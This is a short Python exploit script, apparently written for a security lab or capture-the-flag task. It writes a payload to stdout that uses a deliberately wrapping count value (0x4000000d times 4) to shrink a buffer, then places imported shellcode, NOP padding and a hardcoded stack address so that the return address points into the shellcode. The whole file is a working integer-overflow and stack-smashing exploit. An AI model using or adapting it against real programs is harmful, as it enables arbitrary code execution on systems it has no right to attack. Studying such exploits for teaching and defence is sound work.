import sys
from struct import pack
from shellcode import shellcode
# number that wraps around to give a buffer of size 52 when multiplied by 4
count = pack("<I", 0x4000000d)
# use padding to reach the return address
padding = b'\x90' * (92 - len(shellcode))
# found buffer start through inserting As and inspecting memory
shellcode_address = pack("<I", 0xfff6ece0)

sys.stdout.buffer.write(count + shellcode + padding + shellcode_address)
